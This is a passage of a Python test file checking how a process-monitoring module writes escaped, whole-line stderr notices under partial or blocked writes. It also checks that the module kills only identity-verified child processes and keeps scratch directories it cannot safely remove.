class Interrupting:   # the real write runs, then the interrupt a second SIGINT would raise as it returns
    def __getattr__(self,name): return getattr(real_os,name)
    def write(self,fd,data):
        real_os.write(fd,data)
        raise KeyboardInterrupt('just after the write')
class Short:          # a stream socket under pressure takes only part of the first write
    calls=0
    def __getattr__(self,name): return getattr(real_os,name)
    def write(self,fd,data):
        Short.calls+=1
        return real_os.write(fd,data[:len(data)//2] if Short.calls==1 else data)
class Stuck:          # a reader that never drains: a new line goes in part, then nothing more fits
    def __getattr__(self,name): return getattr(real_os,name)
    def write(self,fd,data):
        if data.startswith((b'retained',b'measure_inventory_render')): return real_os.write(fd,data[:len(data)//2])
        raise BlockingIOError(11,'Resource temporarily unavailable')
class Slow:           # a reader that drains 0.15 s after each part write
    since=0.0
    def __getattr__(self,name): return getattr(real_os,name)
    def write(self,fd,data):
        if data.startswith(b'measure_inventory_render'):
            Slow.since=time.monotonic();return real_os.write(fd,data[:len(data)//2])
        if time.monotonic()-Slow.since<.15: raise BlockingIOError(11,'Resource temporarily unavailable')
        return real_os.write(fd,data)
TWO=['retained /tmp/root (removal_failed)','retained /tmp/other (spawn_children_unknown)']
stream=os.fdopen(w,'w');real_stderr=sys.stderr;sys.stderr=stream
try:
    if mode=='flag':
        fds=len(os.listdir('/proc/self/fd'));m.os=Interrupting()
        try: m.write_notice('x\n')
        except KeyboardInterrupt: out['interrupted']=True
        m.os=real_os
        out['blocking']=os.get_blocking(w);out['fds_kept']=len(os.listdir('/proc/self/fd'))-fds
    elif mode in('short','stuck'):
        m.os=Short() if mode=='short' else Stuck();started=time.monotonic()
        try: m.write_notice('retained /tmp/root (removal_failed)\n')
        except OSError as e: out['raised']=e.errno
        out['seconds']=time.monotonic()-started;m.os=real_os
    elif mode in('short-two','stuck-two','slow-three'):
        m.os={'short-two':Short,'stuck-two':Stuck,'slow-three':Slow}[mode]();started=time.monotonic()
        m.write_notices(TWO+['child 4242 not proven killed: signal refused'] if mode=='slow-three' else TWO)
        out['seconds']=time.monotonic()-started;m.os=real_os
    elif mode=='closed':  # a stream whose own write raises ValueError
        import io;gone=io.StringIO();gone.close();sys.stderr=gone
        try: m.write_notices(TWO);out['dropped']=True
        except ValueError as e: out['raised']=str(e)
        sys.stderr=stream
    elif mode=='socket':  # a real stream socket whose send buffer has room for only part of the line, read late
        a,b=socket.socketpair(socket.AF_UNIX,socket.SOCK_STREAM)
        a.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1);a.setblocking(False)
        try:
            while True: a.send(b'x'*512)
        except BlockingIOError: pass
        b.setblocking(False);got=0
        while got<512: got+=len(b.recv(512-got))
        a.setblocking(True);sock=os.fdopen(os.dup(a.fileno()),'w');sys.stderr=sock;buf=bytearray()
        def drain():
            time.sleep(.05);b.setblocking(True)
            while c:=b.recv(1<<16): buf.extend(c)
        reader=threading.Thread(target=drain);reader.start()
        m.write_notices(['retained /tmp/scratch-'+'r'*3000+'/root (removal_failed)','child 4242 not proven killed: signal refused'])
        sys.stderr=stream;sock.close();a.close();reader.join()
        text=bytes(buf).lstrip(b'x');out.update(socket_lines=text.decode('ascii','replace').splitlines())
    else:
        m.write_notice({'backslash':'retained /tmp/x\\udcff/root\n','cr':'retained /tmp/keep\rx/root\n',
                        'cut-mixed':'retained /tmp/keep\nx\\udcff\r\u00e9'+'a'*5000+'\u00e9/z\n',
                        'cut-escape':'retained /a'+'\u00e9'*2000+'\n','cut-backslash':'retained /a'+'\\'*3000+'\n',
                        'exact':'retained /'+'a'*4085+'\n','newline':'retained /tmp/keep\nx/root (spawn_children_unknown)\n','escape':'retained /tmp/x\udcff/root\n','long':'retained /'+'a'*10000+'\n',
                        'split':'retained /'+'a'*4071+'\u00e9/root'+'x'*100+'\n'}[mode])   # the cut falls inside the e acute
finally:
    sys.stderr=real_stderr
stream.close();data=b''
while chunk:=os.read(r,1<<16): data+=chunk
try: data.decode('utf-8');decodes=True
except UnicodeDecodeError: decodes=False
try: data.removesuffix(b'\n').removesuffix(b' [notice cut]').decode('unicode_escape');unescapes=True
except UnicodeDecodeError: unescapes=False
out.update(unescapes=unescapes,raw_cr=b'\r' in data,text=data.decode('ascii','replace') if len(data)<200 else None,length=len(data),newline=data.endswith(b'\n'),lines=data.count(b'\n'),head=data[:40].decode('ascii','replace'),
           tail=data[-20:].decode('utf-8','replace'),decodes=decodes,pipe_buf=select.PIPE_BUF)
print(json.dumps(out))
"""


def run_notice_probe(tmp_path, mode):
    r = subprocess.run([sys.executable, "-c", NOTICE_PROBE, str(REPO / MEASURE), mode], capture_output=True, text=True,
                       timeout=15, cwd=tmp_path)
    assert r.returncode == 0, r.stdout + r.stderr
    return json.loads(r.stdout)


def test_measure_inventory_render_notice_restores_the_flag_when_interrupted(tmp_path):
    """An interrupt arriving at the write leaves the caller's stderr blocking (#1700 pass 24 R1 F1) and closes the
    private description the notice was written through (pass 34 R1 F2)."""
    seen = run_notice_probe(tmp_path, "flag")
    assert seen["interrupted"] is True and seen["blocking"] is True and seen["fds_kept"] == 0, seen


def test_measure_inventory_render_notice_escapes_a_non_utf8_path(tmp_path):
    """A non-UTF-8 byte in a retained root's name stays an escape, not a "?" that names another path (pass 24 R1 F2)."""
    seen = run_notice_probe(tmp_path, "escape")
    assert seen["head"] == "retained /tmp/x\\udcff/root\n", seen


def test_measure_inventory_render_notice_longer_than_pipe_buf_is_one_whole_line(tmp_path):
    """A notice over PIPE_BUF is cut to one whole line of PIPE_BUF bytes, so a pipe never takes part of it
    (pass 24 R1 F3), and the cut is marked, so the shortened path is never read as a whole one (pass 25 R1 F1)."""
    seen = run_notice_probe(tmp_path, "long")
    assert seen["length"] == seen["pipe_buf"] and seen["lines"] == 1 and seen["tail"].endswith("a [notice cut]\n"), seen


def test_measure_inventory_render_notice_cut_never_splits_a_character(tmp_path):
    """A notice is escaped to ASCII before any cut, so a cut never falls inside a character and the line still
    decodes (pass 25 R1 F1)."""
    seen = run_notice_probe(tmp_path, "split")
    assert seen["decodes"] and seen["tail"].endswith("a [notice cut]\n") and seen["length"] == seen["pipe_buf"] - 1, seen


def test_measure_inventory_render_notice_cut_never_splits_an_escape(tmp_path):
    """The cut falls between whole escapes, so a cut line's text still decodes with unicode_escape: neither a
    partial \\xe9 nor a lone backslash is left before the marker (pass 27 R1 F2)."""
    for mode in ("cut-escape", "cut-backslash"):
        seen = run_notice_probe(tmp_path, mode)
        assert seen["unescapes"] and seen["lines"] == 1 and seen["length"] <= seen["pipe_buf"], (mode, seen)
        assert seen["tail"].endswith(" [notice cut]\n"), (mode, seen)
    # The cut keeps escaping every character: a line feed, a backslash and a carriage return before the cut.
    seen = run_notice_probe(tmp_path, "cut-mixed")
    assert seen["lines"] == 1 and seen["length"] <= seen["pipe_buf"] and seen["unescapes"], seen
    assert seen["head"].startswith("retained /tmp/keep\\nx\\\\udcff\\r\\xe9aaa") and seen["tail"] == "aaaaaa [notice cut]\n", seen


def test_measure_inventory_render_notice_escapes_a_backslash_and_a_carriage_return(tmp_path):
    """A literal backslash is doubled, so a path holding the text \\udcff is not written as the escape of the byte
    0xff, and a carriage return is escaped, never written raw (pass 27 R4 F1)."""
    seen = run_notice_probe(tmp_path, "backslash")
    assert seen["head"] == "retained /tmp/x\\\\udcff/root\n", seen
    seen = run_notice_probe(tmp_path, "cr")
    assert not seen["raw_cr"] and seen["head"].startswith("retained /tmp/keep\\rx/root"), seen


def test_measure_inventory_render_notice_of_exactly_pipe_buf_is_not_cut(tmp_path):
    """A notice of exactly PIPE_BUF bytes fits and is written whole, with no marker (pass 26 R4 F3)."""
    seen = run_notice_probe(tmp_path, "exact")
    assert seen["length"] == seen["pipe_buf"] and seen["tail"] == "a" * 19 + "\n", seen


def test_measure_inventory_render_notice_keeps_a_line_feed_in_a_path_on_one_line(tmp_path):
    """A line feed in a scratch root's path is escaped, so the notice stays one line and its first line never names
    another directory as the kept root (pass 26 R1 F1)."""
    seen = run_notice_probe(tmp_path, "newline")
    assert seen["lines"] == 1 and seen["head"].startswith("retained /tmp/keep\\nx/root (spawn_child"), seen


def test_measure_inventory_render_notice_written_in_part_raises(tmp_path):
    """A part write whose rest the descriptor never takes (a reader that does not drain) raises EIO once the budget
    runs out, so write_notices writes no further notice (pass 26 R1 F2, pass 27 R3 F1)."""
    import errno
    seen = run_notice_probe(tmp_path, "stuck")
    assert seen.get("raised") == errno.EIO and seen["lines"] == 0 and 0.2 <= seen["seconds"] < 1.5, seen


def test_measure_inventory_render_no_notice_joins_a_part_written_one(tmp_path):
    """A part write is finished as the descriptor takes more, so the line arrives whole and the next notice starts
    a line of its own (pass 27 R1 F1, pass 28 R1 F1 and F2)."""
    seen = run_notice_probe(tmp_path, "short")
    assert "raised" not in seen and seen["text"] == "retained /tmp/root (removal_failed)\n", seen
    seen = run_notice_probe(tmp_path, "short-two")
    assert seen["lines"] == 2 and seen["text"].endswith("retained /tmp/other (spawn_children_unknown)\n"), seen


def test_measure_inventory_render_writes_no_notice_after_one_left_in_part(tmp_path):
    """When the rest of a part-written notice cannot be written within the shared budget, no further notice is
    written, so none joins the fragment, and the wait stays bounded (pass 27 R1 F1)."""
    seen = run_notice_probe(tmp_path, "stuck-two")
    assert seen["lines"] == 0 and seen["text"].count("measure_inventory_render") == 1 and seen["seconds"] < 1.5, seen


def test_measure_inventory_render_notices_drop_a_stream_that_raises_value_error(tmp_path):
    """A stream that raises ValueError on write (closed) drops each notice; nothing propagates (pass 28 R4 F3)."""
    seen = run_notice_probe(tmp_path, "closed")
    assert seen.get("dropped") and "raised" not in seen, seen


def test_measure_inventory_render_notices_share_one_finishing_budget(tmp_path):
    """Notices that each need 0.15 s to finish share one 0.25 s budget, so a slow reader cannot stretch the cleanup
    by a wait per notice: the first is finished and the second is cut off with nothing after it."""
    seen = run_notice_probe(tmp_path, "slow-three")
    assert seen["lines"] == 1 and "removal_failed" in seen["text"] and "4242" not in seen["text"], seen


def test_measure_inventory_render_notice_over_a_stream_socket_arrives_whole(tmp_path):
    """A real stream socket takes only part of a long notice while its buffer is full; the notice is finished once
    the reader drains, so each notice is one whole line (pass 28 R1 F1)."""
    seen = run_notice_probe(tmp_path, "socket")
    lines = seen["socket_lines"]
    assert len(lines) == 2 and lines[0].endswith("/root (removal_failed)") and lines[1].endswith("signal refused"), seen


FINISH_PROBE = r"""
import fcntl,importlib.util,json,os,resource,socket,sys,threading,time
s=importlib.util.spec_from_file_location('m',sys.argv[1]);m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
mode=sys.argv[2];real_os=os;real_stderr=sys.stderr;out={}
LONG='retained /tmp/scratch-'+'r'*3000+'/root (removal_failed)'
def read_all(fd):
    data=b''
    while c:=os.read(fd,1<<16): data+=c
    return data
started=time.monotonic();cpu=time.process_time()
if mode in ('stuck-socket','epipe','shared-flag'):   # a real stream socket whose reader never drains or closes
    a,b=socket.socketpair(socket.AF_UNIX,socket.SOCK_STREAM)        # after 0.03 s (epipe): part of the line fits
    a.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,1);a.setblocking(False)
    try:
        while True: a.send(b'x'*512)
    except BlockingIOError: pass
    b.setblocking(False);got=0
    while got<512: got+=len(b.recv(512-got))
    a.setblocking(True);sys.stderr=os.fdopen(os.dup(a.fileno()),'w')
    if mode=='epipe': threading.Timer(0.03,b.close).start()
    if mode=='shared-flag':   # another holder of the same open file description looks at it during the wait
        other=os.dup(a.fileno());look=threading.Timer(0.1,lambda: out.__setitem__('blocking_mid_wait',os.get_blocking(other)))
        look.start()
    m.write_notices([LONG,'child 4242 not proven killed: signal refused'])
    if mode=='shared-flag': look.join();out['blocking_after']=os.get_blocking(other)
elif mode=='trickle':      # each write takes at most 1000 bytes, so the rest of a notice takes several writes
    r,w=os.pipe()
    class Trickle:
        def __getattr__(self,name): return getattr(real_os,name)
        def write(self,fd,data): return real_os.write(fd,data[:1000])
    sys.stderr=os.fdopen(w,'w');m.os=Trickle()
    m.write_notices([LONG,'child 4242 not proven killed: signal refused'])
    m.os=real_os;sys.stderr.close();out['lines']=read_all(r).decode().splitlines()
elif mode=='fullish':      # a pipe with 100 bytes free: the cut 4096-byte notice is refused, a short one after it fits
    r,w=os.pipe();size=fcntl.fcntl(w,1032)   # F_GETPIPE_SZ
    os.set_blocking(w,False);os.write(w,b'x'*(size-100));os.set_blocking(w,True)
    sys.stderr=os.fdopen(w,'w')
    m.write_notices(['retained /tmp/scratch-'+'r'*5000+'/root (removal_failed)','child 42 gone'])
    sys.stderr.close();out['after']=read_all(r)[size-100:].decode()
elif mode=='fsize':        # a regular file 100 bytes short of RLIMIT_FSIZE: one part write, then EFBIG
    f=open(sys.argv[3],'wb');f.write(b'y'*900);f.flush()
    resource.setrlimit(resource.RLIMIT_FSIZE,(1000,resource.getrlimit(resource.RLIMIT_FSIZE)[1]));sys.stderr=f
    m.write_notices(['retained /tmp/root (removal_failed) '+'q'*200,'child 4242 not proven killed: signal refused'])
sys.stderr=real_stderr
out.update(seconds=time.monotonic()-started,cpu=time.process_time()-cpu)
print(json.dumps(out))
"""


def run_finish_probe(tmp_path, mode):
    r = subprocess.run([sys.executable, "-c", FINISH_PROBE, str(REPO / MEASURE), mode, str(tmp_path / "stderr.out")],
                       capture_output=True, text=True, timeout=15, cwd=tmp_path)
    assert r.returncode == 0, r.stdout + r.stderr
    return json.loads(r.stdout)


def test_measure_inventory_render_notice_wait_leaves_a_shared_stderr_blocking(tmp_path):
    """Stderr's open file description is shared with other processes, so it stays blocking through the finishing
    wait and after it (#1700 pass 33 R1 F2); since FIX22 no write changes its flags at all (pass 34 R1 F2)."""
    seen = run_finish_probe(tmp_path, "shared-flag")
    assert seen["blocking_mid_wait"] is True and seen["blocking_after"] is True, seen


FLAGS_PROBE = r"""
import fcntl,importlib.util,json,os,pty,socket,sys,threading
s=importlib.util.spec_from_file_location('m',sys.argv[1]);m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
real_os=os
class Guarded:      # any change to a descriptor's flags fails the probe: the open file description is shared
    def __getattr__(self,name): return getattr(real_os,name)
    def set_blocking(self,fd,flag): raise AssertionError(f'set_blocking({fd},{flag})')
m.os=Guarded()
def setter(*a):
    if len(a)>1 and a[1]==fcntl.F_SETFL: raise AssertionError('F_SETFL')
    return real_fcntl(*a)
real_fcntl=fcntl.fcntl;fcntl.fcntl=setter
out={};saved=os.dup(2)
def rd(fd):         # never waits long: a notice that was not written reads as nothing
    import select
    return os.read(fd,4096).decode() if select.select([fd],[],[],2)[0] else ''
def run(kind,fd,read):
    os.dup2(fd,2);before=os.get_blocking(2)
    try:
        m.write_notices(['one '+kind,'two '+kind]);err=None
    except BaseException as e:
        err=f'{type(e).__name__}:{e}'
    after=os.get_blocking(2);os.dup2(saved,2)
    out[kind]={'error':err,'unchanged':before==after,'text':read()}
r,w=os.pipe();run('pipe',w,lambda:rd(r))
a,b=socket.socketpair();run('socket',b.fileno(),lambda:rd(a.fileno()))
mfd,sfd=pty.openpty();run('terminal',sfd,lambda:rd(mfd))
print(json.dumps(out))
"""


def test_measure_inventory_render_notice_never_changes_stderr_flags(tmp_path):
    """Notices go through a private non-blocking description (a pipe, a terminal) or MSG_DONTWAIT (a socket), so the
    shared description's flags are never changed and two writers cannot leave stderr non-blocking for each other
    (#1700 pass 34 R1 F2); each notice still arrives whole."""
    r = subprocess.run([sys.executable, "-B", "-c", FLAGS_PROBE, str(REPO / MEASURE)], capture_output=True, text=True,
                       timeout=30, cwd=tmp_path)
    assert r.returncode == 0, r.stdout + r.stderr
    for kind, seen in json.loads(r.stdout).items():
        assert seen["error"] is None and seen["unchanged"], (kind, seen)
        assert f"measure_inventory_render: one {kind}" in seen["text"] and f"two {kind}" in seen["text"], (kind, seen)


def test_measure_inventory_render_notice_wait_is_bounded_on_a_socket_that_never_drains(tmp_path):
    """The finishing wait on a real socket that never becomes writable ends with the 0.25 s budget, not later
    (pass 29 R4 F1; the upper bound tightened in pass 30 R4 F1, so a select that waits past the budget fails)."""
    seen = run_finish_probe(tmp_path, "stuck-socket")
    assert 0.2 <= seen["seconds"] < 0.75, seen


def test_measure_inventory_render_notice_finish_stops_when_the_reader_closes(tmp_path):
    """A reader that closes while the rest of a notice waits makes the next write fail with EPIPE, and the finish
    stops at once instead of retrying for the whole budget (pass 30 R4 F2)."""
    seen = run_finish_probe(tmp_path, "epipe")
    assert seen["seconds"] < 0.15, seen


def test_measure_inventory_render_notice_rest_written_in_several_parts(tmp_path):
    """The rest of a part-written notice can itself take several writes, each continuing where the last stopped
    (pass 29 R4 F2)."""
    seen = run_finish_probe(tmp_path, "trickle")
    assert len(seen["lines"]) == 2 and seen["lines"][0].endswith("r/root (removal_failed)"), seen
    assert seen["lines"][0] == "measure_inventory_render: retained /tmp/scratch-" + "r" * 3000 + "/root (removal_failed)", seen
    assert seen["lines"][1].endswith("signal refused"), seen


def test_measure_inventory_render_notices_go_on_after_one_that_does_not_fit(tmp_path):
    """A notice refused whole by a nearly full pipe is dropped and the next one is still written; only a part
    write stops the notices (pass 29 R4 F3)."""
    seen = run_finish_probe(tmp_path, "fullish")
    assert seen["after"] == "measure_inventory_render: child 42 gone\n", seen


def test_measure_inventory_render_notice_finish_stops_at_a_size_limit(tmp_path):
    """A regular file at its size limit refuses the rest with EFBIG, and the finish stops at once instead of
    retrying for the whole budget (pass 29 R4 F4)."""
    seen = run_finish_probe(tmp_path, "fsize")
    assert seen["seconds"] < 0.1, seen


STALLED_PROBE = r"""
import importlib.util,io,json,os,pathlib,signal,sys
s=importlib.util.spec_from_file_location('m',sys.argv[1]);m=importlib.util.module_from_spec(s);s.loader.exec_module(m)
real_popen=m.subprocess.Popen;spawned=[]
def interrupted(*a,**kw):
    spawned.append(real_popen(*a,**kw).pid)
    raise KeyboardInterrupt('after fork')
m.subprocess.Popen=interrupted
m.kill_unregistered=lambda children,deadline,outcomes=None:[]   # a pass that examines and reaps nothing
notice=io.StringIO();real_stderr=sys.stderr;sys.stderr=notice
try:
    m.run_bounded([sys.executable,'-c','import time;time.sleep(30)'],pathlib.Path.cwd(),max_rss_bytes=64<<20,max_seconds=20)
except KeyboardInterrupt:
    pass
finally:
    sys.stderr=real_stderr
    for pid in spawned:
        os.kill(pid,signal.SIGKILL);os.waitpid(pid,0)
print(json.dumps({'pid':spawned[0],'notice':notice.getvalue()}))
"""


def test_measure_inventory_render_names_a_child_left_after_a_pass_that_reaped_nothing(tmp_path):
    """The passes stop after one that reaps nothing, well before the deadline; a child left unexamined then is named
    for that, not "not examined before the deadline" (closure21 item 5)."""
    scratch = tmp_path / "tmp"
    scratch.mkdir()
    r = subprocess.run([sys.executable, "-c", STALLED_PROBE, str(REPO / MEASURE)], capture_output=True, text=True,
                       timeout=30, cwd=tmp_path, env={**os.environ, "TMPDIR": str(scratch)})
    assert r.returncode == 0, r.stdout + r.stderr
    seen = json.loads(r.stdout)
    assert f"child {seen['pid']} not proven killed: not examined: the pass before it reaped nothing" in seen['notice'], seen
    assert "not examined before the deadline" not in seen['notice'], seen


def test_measure_inventory_render_keeps_a_scratch_root_it_cannot_prove_free(tmp_path):
    """Retention is reported on its own fields, never as a family failure, and never deletes through a link."""
    # A root replaced by a link fails closed: the reaped family stays reported as gone and the target survives.
    report, _, outer, victim = scratch_measurement(tmp_path, 'symlink-root')
    assert report['owned_family_gone'] and report['reason'] == 'scratch_cleanup_incomplete' and not report['ok'], report
    assert report['scratch_root_retained_reason'] == 'removal_failed' and 'scratch_root_error' in report, report
    assert not report['scratch_root_removed'] and (victim / 'keep.txt').read_text() == 'keep', report
    # A different directory put in the root's place is not the one the monitor created, so nothing in it is removed.
    report, _, outer, _ = scratch_measurement(tmp_path, 'replaced-root')
    assert report['owned_family_gone'] and report['scratch_root_retained_reason'] == 'removal_failed', report
    assert 'no longer the directory' in report['scratch_root_error'], report
    assert (Path(report['scratch_root']) / 'keep.txt').read_text() == 'keep', report
    # A child that exists before the monitor binds it is killed and reaped through a PIDfd whose PID still has
    # the listed start ticks, and only then is its root removed; the monitor says so on stderr (QUAL1 R1 F2).
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered', seconds=2)
    assert report['raised'] == 'KeyboardInterrupt' and not report['spawned']['alive'], report
    assert report['outer_after'] == [], report
    assert f"killed unregistered child {report['spawned']['pid']}" in report['notice'], report
    # A descendant the killed child left behind is adopted, seen by the relist with readable start ticks, and killed
    # and reaped by the same identity-checked PIDfd pass; with no descendant left the root is removed (QUAL2 R1 F1).
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-grandchild', seconds=2)
    assert report['raised'] == 'KeyboardInterrupt' and not report['spawned']['alive'], report
    assert report['children_at_assertion'] == [] and report['outer_after'] == [], report
    killed = [line for line in report['notice'].splitlines() if 'killed unregistered child' in line]
    assert len(killed) == 2 and f"killed unregistered child {report['spawned']['pid']}" in killed[0], report
    # A child whose identity cannot be checked is never signalled: it is alive when this asserts, the root is kept,
    # and the receipt and stderr name it. Only the launcher's own cleanup ends it, afterwards.
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-unidentified', seconds=2)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['alive'], report
    assert [c['pid'] for c in report['children_at_assertion']] == [pid] and report['children_after_cleanup'] == [], report
    kept = report['outer_after']
    assert len(kept) == 1 and f"retained {outer / kept[0]} (spawn_not_registered)" in report['notice'], report
    assert f"child {pid} not proven killed: identity unverified" in report['notice'], report
    assert 'killed unregistered' not in report['notice'], report
    spawn = [e for e in report['receipts'][0] if e['event'] == 'unregistered_spawn']
    assert spawn and spawn[0]['killed'] == [] and [c['pid'] for c in spawn[0]['remaining']] == [pid], report
    assert spawn[0]['reasons'] == {str(pid): 'identity unverified'}, report
    # A stderr that cannot be written does not replace the interrupt or skip the kill, the removal or the restore of
    # the caller's subreaper state (QUAL2 R1 F2).
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-broken-stderr', seconds=2)
    assert report['raised'] == 'KeyboardInterrupt' and not report['spawned']['alive'], report
    assert report['outer_after'] == [] and report['subreaper_after'] == 0 and report['children_at_assertion'] == [], report


def test_measure_inventory_render_signals_and_names_every_unregistered_child(tmp_path):
    """An identified unregistered child is signalled even after the deadline, and each one left alive or unreaped is
    named on stderr with why, before and whatever the receipt write does (QUAL3 R1 F1, R1 F2, R3 F3)."""
    # Interrupted after the whole deadline: the first pass still sends SIGKILL; only reaping is out of time, so the
    # root is kept and the child is named as signalled, not as unidentified.
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-late', seconds=1)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['returncode'] == -9, report   # SIGKILL
    kept = report['outer_after']
    assert len(kept) == 1 and f"retained {outer / kept[0]} (spawn_not_registered)" in report['notice'], report
    assert f"child {pid} not proven killed: signalled, not reaped by the deadline" in report['notice'], report
    spawn = [e for e in report['receipts'][0] if e['event'] == 'unregistered_spawn']
    assert spawn and spawn[0]['reasons'] == {str(pid): 'signalled, not reaped by the deadline'}, report
    # Interrupted after the whole deadline while the child has a live grandchild in its own session: the first pass
    # signals the child and, from the same process-table read, each descendant of an identified child whose own
    # identity checks, so the grandchild is killed although it is adopted only after the deadline. Neither is reaped
    # in time: the root is kept, both are named as signalled and none as never examined, and the caller's subreaper
    # state is restored.
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-late-grandchild', seconds=1)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['returncode'] == -9, report   # SIGKILL
    grand = [c['pid'] for c in report['children_at_assertion'] if c['pid'] != pid]
    assert len(grand) == 1 and report['states_at_assertion'][str(grand[0])] == 'Z', report   # killed, not running
    assert report['subreaper_after'] == 0 and report['children_after_cleanup'] == [], report
    kept = report['outer_after']
    assert len(kept) == 1 and f"retained {outer / kept[0]} (spawn_not_registered)" in report['notice'], report
    assert f"child {grand[0]} not proven killed: signalled, not reaped by the deadline" in report['notice'], report
    assert 'not examined before the deadline' not in report['notice'], report
    spawn = [e for e in report['receipts'][0] if e['event'] == 'unregistered_spawn']
    assert spawn and spawn[0]['reasons'] == {str(pid): 'signalled, not reaped by the deadline',
                                             str(grand[0]): 'signalled, not reaped by the deadline'}, report
    # A signal the kernel refuses leaves the child alive, the root kept, and the reason named.
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-signal-refused', seconds=2)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['alive'], report
    kept = report['outer_after']
    assert len(kept) == 1 and f"retained {outer / kept[0]} (spawn_not_registered)" in report['notice'], report
    assert f"child {pid} not proven killed: signal refused" in report['notice'], report
    assert report['children_after_cleanup'] == [], report
    # Ownership negative control: a child whose signal alone is refused, with a live grandchild in its own session.
    # A refused child is not a signalled one, so its subtree is never examined: no signal at all is sent, and the
    # grandchild is still running (QUAL7 R4 F1).
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-signal-refused-grandchild', seconds=2)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['alive'] and report['signals'] == [], report
    assert report['grandchild_at_assertion']['state'] not in ('Z', 'X', 'gone'), report   # not signalled
    assert f"child {pid} not proven killed: signal refused" in report['notice'], report
    assert report['children_after_cleanup'] == [], report
    # A start time that cannot be read after the PIDfd opens is an unverified identity: no signal is sent, the child
    # is left alive, the root kept, and the reason says so rather than "signal refused" (QUAL4 R1 F2).
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-identity-unreadable', seconds=2)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['alive'] and report['signals'] == [], report
    kept = report['outer_after']
    assert len(kept) == 1 and f"retained {outer / kept[0]} (spawn_not_registered)" in report['notice'], report
    assert f"child {pid} not proven killed: identity unverified" in report['notice'], report
    spawn = [e for e in report['receipts'][0] if e['event'] == 'unregistered_spawn']
    assert spawn and spawn[0]['reasons'] == {str(pid): 'identity unverified'}, report
    assert report['children_after_cleanup'] == [], report
    # Ownership negative control: an identity-unverified child with a live grandchild in its own session. The child
    # is never signalled, and neither is any descendant of it, because only descendants of a child the pass identified
    # and signalled are examined (QUAL4 R1): no signal at all is sent, and the grandchild is still running.
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-identity-unreadable-grandchild', seconds=2)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['alive'] and report['signals'] == [], report
    assert report['grandchild_at_assertion']['state'] not in ('Z', 'X', 'gone'), report   # not signalled
    assert f"child {pid} not proven killed: identity unverified" in report['notice'], report
    assert report['children_after_cleanup'] == [], report
    # The child broke its root's receipt and cannot be identified: the receipt write fails, and stderr still names
    # the live child and the kept root with that error.
    report, _, outer, _ = scratch_measurement(tmp_path, 'unregistered-unidentified-receipt', seconds=2)
    pid = report['spawned']['pid']
    assert report['raised'] == 'KeyboardInterrupt' and report['spawned']['alive'], report
    kept = report['outer_after']
    assert len(kept) == 1 and report['receipts'] == [None], report
    assert f"child {pid} not proven killed: identity unverified" in report['notice'], report
    assert f"retained {outer / kept[0]} (spawn_not_registered): IsADirectoryError" in report['notice'], report
    assert report['children_after_cleanup'] == [], report


KILL_AND_RECEIPT_PROBE = r"""
import importlib.util,json,os,subprocess,sys,time,types
s=importlib.util.spec_from_file_location('inventory_identity',sys.argv[1]);m=importlib.util.module_from_spec(s);sys.modules[s.name]=m;s.loader.exec_module(m)
p=subprocess.Popen([sys.executable,'-c','import time;time.sleep(20)']);time.sleep(.1)
start=m.process_start(p.pid);r={}
r['wrong']=m.kill_unregistered([{'pid':p.pid,'start_ticks':start+1}],time.monotonic()+2);r['alive_after_wrong']=p.poll() is None
r['right']=m.kill_unregistered([{'pid':p.pid,'start_ticks':start}],time.monotonic()+2);r['alive_after_right']=p.poll() is None
if p.poll() is None:p.kill();p.wait()
d=sys.argv[2];os.mkfifo(os.path.join(d,'CREATED-BY'));reader=os.open(os.path.join(d,'CREATED-BY'),os.O_RDONLY|os.O_NONBLOCK)
dfd=os.open(d,os.O_RDONLY|os.O_DIRECTORY)
try:
    m.append_receipt(types.SimpleNamespace(fd=dfd),{'event':'probe'});r['fifo']='written'
except OSError as e:
    r['fifo']=str(e)
t={10:(100,1),11:(110,10),12:(120,11),13:(90,10),20:(200,1),21:(210,20),30:(300,1),31:(310,30)}
r['owned_children']=m.owned_children([{'pid':10,'start_ticks':100},{'pid':20,'start_ticks':150}],t)
# kill_descendants against fake PIDfds: `now` is each PID's current start ticks, `sent` the PIDs signalled, and a
# signal to a PID in `refuse` raises as the kernel's refusal does.
fds,sent,refuse={},[],set()
def fake_open(pid):fd=os.open(os.devnull,os.O_RDONLY);fds[fd]=pid;return fd
def fake_send(fd,sig):
    if fds[fd] in refuse:raise PermissionError(1,'Operation not permitted')
    sent.append(fds[fd])
m.os.pidfd_open=fake_open;m.signal.pidfd_send_signal=fake_send
for name,now,refused in (('verified',{11:110,12:130},()),('reused',{11:120,12:130},()),('refused',{11:110,12:130},(11,))):
    sent.clear();outcomes={};refuse.clear();refuse.update(refused)
    m.process_start=lambda pid:now[pid]
    m.kill_descendants([{'pid':10,'start_ticks':100}],{10:(100,1),11:(110,10),12:(130,11)},time.monotonic()+1,outcomes)
    r[name]={'sent':list(sent),'outcomes':{str(k[0]):v for k,v in outcomes.items()}}
r['start']=start;r['pid']=p.pid
print(json.dumps(r))
"""


def test_measure_inventory_render_kills_only_the_listed_identity_and_writes_only_a_regular_receipt(tmp_path):
    """kill_unregistered signals a PID only while it still has the listed start ticks (QUAL1 R1 F2), and a receipt
    that is a FIFO with a reader is refused by its file type, not written into (QUAL1 R4 F2)."""
